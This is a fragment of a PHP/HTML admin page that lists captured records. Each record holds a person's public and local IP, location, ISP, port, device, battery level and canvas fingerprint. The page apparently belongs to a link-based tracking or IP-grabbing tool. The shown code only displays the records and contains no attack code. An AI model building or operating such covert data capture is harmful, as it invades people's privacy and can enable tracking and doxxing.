                                <div class="info-row" style="margin-top:10px;"><span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars(addslashes($cap['code'])); ?>')"><?php echo htmlspecialchars($cap['code']); ?> 📋</span></div>
                                <div class="info-row"><span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
                                <div class="info-row"><span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span></div>
                                <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
                                <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
                                
                                <div class="info-row" style="background: rgba(139, 92, 246, 0.1); padding: 4px; border-radius: 4px; margin-top: 8px;"><span>Port:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['port']); ?></span></div>
                                <div class="info-row"><span>Device:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
                                <div class="info-row"><span>Battery:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['battery_info']); ?></span></div>
                                <div class="info-row"><span>Fingerprint:</span> <span style="color:#a78bfa; font-family: monospace;"><?php echo htmlspecialchars($cap['canvas_fp']); ?></span></div>

                                <div class="info-row" style="border-top:1px solid var(--border); padding-top:6px; margin-top:8px;"><span>Time:</span> <span style="color:#a78bfa; font-weight:bold;"><?php echo htmlspecialchars($cap['created_at']); ?></span></div>
                                <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn-delete" onclick="return confirm('حذف السجل؟');">حذف السجل</a>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        <?php endif; ?>
    </div>
    <div class="toast" id="toast">✅ تم النسخ بنجاح!</div>
    <footer><p>Developed by <span style="color:var(--accent);">azeez</span> &copy; 2026</p></footer>
</body>
</html>
